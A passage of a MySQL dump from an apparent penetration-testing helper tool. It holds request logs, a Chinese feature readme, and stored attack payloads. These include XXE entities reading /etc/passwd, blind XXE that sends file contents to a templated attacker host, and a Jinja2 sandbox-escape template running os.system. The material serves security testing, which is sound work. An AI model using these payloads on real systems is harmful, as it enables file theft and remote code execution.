AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:29:55\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1328,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:29:58\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1329,35,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cache-Control\": \"max-age=0\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:30:41\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1295,2,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:13:09\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(1296,2,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Cache-Control\": \"max-age=0\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"If-Modified-Since\": \"Fri, 10 Aug 2018 10:10:00 GMT\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-10 18:13:13\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(3226,40,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999; thinkjs=d90298d4-1efd-4d86-8215-c5e6daeab290\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-26 00:42:10\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(3227,41,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\", \"Host\": \"localhost:8081\", \"Referer\": \"http://localhost:8081/admin\", \"Cookie\": \"_ga=GA1.1.1717563741.1533205999; thinkjs=d90298d4-1efd-4d86-8215-c5e6daeab290\", \"Upgrade-Insecure-Requests\": \"1\"}, \"time\": \"2018-08-26 00:42:11\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}'),(3230,34,'{\"remote_addr\": \"127.0.0.1\", \"headers\": {\"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"keep-alive\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\", \"Host\": \"0.0.0.0:8081\", \"Referer\": \"http://0.0.0.0:8081/admin\", \"Cookie\": \"connect.sid=s%3AivCibzSawBemfdr2HlRCEyaBqiy6k9Jz.g6%2FUfHky%2FPZpDWSNkZFaAe%2F3pBvGxPDtQuASCxdk%2Bp4; loginstate=false\", \"Upgrade-Insecure-Requests\": \"1\", \"Content-Type\": \"text/plain\"}, \"time\": \"2018-09-10 00:33:55\", \"query_string\": \"\", \"data\": \"\", \"method\": \"GET\"}');
/*!40000 ALTER TABLE `log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `payload`
--

DROP TABLE IF EXISTS `payload`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `payload` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(80) DEFAULT NULL,
  `value` text,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `payload`
--

LOCK TABLES `payload` WRITE;
/*!40000 ALTER TABLE `payload` DISABLE KEYS */;
INSERT INTO `payload` VALUES (1,'xxe','<!DOCTYPE a[\r\n    <!ENTITY file SYSTEM \"file:///etc/passwd\">\r\n]>\r\n<c>&file;</c>'),(2,'blind_xxe','<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\" ?>\r\n<!DOCTYPE root [\r\n\r\n<!ENTITY % remote SYSTEM \"http://{{host}}:8080/2\">\r\n%remote;\r\n]>\r\n</root>'),(3,'blind_xxe2','<!ENTITY % payload SYSTEM        \"file:///etc/issue\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM \'http://{{host}}/%payload;\'>\">\r\n%int;\r\n%trick;');
/*!40000 ALTER TABLE `payload` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `rule`
--

DROP TABLE IF EXISTS `rule`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `rule` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `method` varchar(80) DEFAULT NULL,
  `path` varchar(80) DEFAULT NULL,
  `code` varchar(80) DEFAULT NULL,
  `headers` text,
  `remote` text,
  `body` text,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=43 DEFAULT CHARSET=utf8mb4 ROW_FORMAT=COMPACT;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `rule`
--

LOCK TABLES `rule` WRITE;
/*!40000 ALTER TABLE `rule` DISABLE KEYS */;
INSERT INTO `rule` VALUES (1,'[\"GET\"]','/xxe','200','[{\"name\": \"Content-Type\", \"value\": \"text/plain\"}, {\"name\": \"ss\", \"value\": \"s2\"}]','{\"headers\": [], \"data\": \"a=3&b=4\", \"params\": \"a=1&b=2\"}','<!DOCTYPE a[\n    <!ENTITY file SYSTEM \"file:///etc/passwd\">\n]>\n<c>&file;</c>'),(28,'[\"GET\", \"POST\"]','/readme','200','[{\"name\": \"Content-Type\", \"value\": \"text/plain; charset=utf-8\"}]','{}','1.创建任意HTTP响应(自定义请求方法、路径、状态码、请求头)\n2.响应内容支持自定义变量、jinja2模板语法和部分自定义过滤器\n3.查看对应路径请求日志信息\n4.自定义XXE Payload生成恶意文档(doc、xlsx、ppt)\n5.自定义代理请求(中转服务器)\n6.在线端口监听查看请求、tcpdump查看数据包(ICMP、TCP、UDP)\n\nhost: {{host}}\nport: {{port}}\ncmd: {{cmd}}\n\n# filter\n{{ cmd | upper }}\n{{ cmd | lower }}\n{{ cmd | title }}\n{{ cmd | capitalize }}\n{{ my_variable | default(\'my_variable is not defined\') }}\n{{ [1, 2, 3] | join(\'|\') }}\n{{ \"Hello World\"|replace(\"Hello\", \"Goodbye\") }}\n...\n\n# custom request variables\nrequest_method: {{ request.method }}\nrequest.path: {{ request.path }}\nrequest.args: {{ request.args }}\nrequest.form: {{ request.form }}\nrequest.query_string: {{ request.query_string | safe }}\nrequest.body: {{ request.body }}\nrequest.headers[\'User-Agent\'] {{ request.headers[\'User-Agent\'] }}\nREQUEST_HEADERS_STR:\n{%for k, v in request.headers.items()%}\n{{-k}}:{{v}}\n{%endfor%}\n\n# custom hash filter (filters.py)\n\'admin\'|md5: {{ \'admin\' | md5 }}\n\'admin\'|base64encode: {{ \'admin\' | base64encode }}\n\'admin\'|base64decode: {{ \'admin\' | base64decode }}'),(33,'[\"GET\"]','/remote','200','[]','{\"url\": \"http://127.0.0.1:8081/readme\", \"headers\": [{\"name\": \"User-Agent\", \"value\": \"curl\"}, {\"name\": \"X-User-Agent\", \"value\": \"{{ request.headers[\'User-Agent\'] }}\"}], \"data\": \"c=3&d=4\", \"method\": \"GET\", \"params\": \"a=1&b=2\"}',NULL),(34,'[\"GET\"]','/encode','200','[]','{\"url\": \"\", \"headers\": [], \"params\": \"\", \"method\": \"GET\"}','{{request.args.get(\'s\',\'admin\')|base64encode}}'),(37,'[\"GET\"]','/hash','200','[{\"name\": \"Content-Type\", \"value\": \"text/plain\"}]','{\"headers\": []}','{{ request.args.get(\'s\', \'admin\')|md5 }}\n{{ request.args.get(\'s\', \'admin\')|sha1 }}'),(38,'[\"GET\"]','/sandbox','200','[]','{\"headers\": []}','\n\n{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == \'catch_warnings\' %}\n{{ c.__init__.func_globals[\'linecache\'].__dict__[\'os\'].system(\'id\') }}\n{% endif %}\n{% endfor %}\n1\n2\n3\n4\n5\n{% for c in [].__class__.__base__.__subclasses__() %}\n{% if c.__name__ == \'catch_warnings\' %}\n{{ c.__init__.func_globals[\'linecache\'].__dict__[\'os\'].system(\'id\') }}\n{% endif %}\n{% endfor %}'),(42,'[\"GET\"]','/cmd','200','[]','{\"headers\": []}','{{request.args.get(cmd, \'get cmd\')}}');
/*!40000 ALTER TABLE `rule` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2018-09-10  0:34:04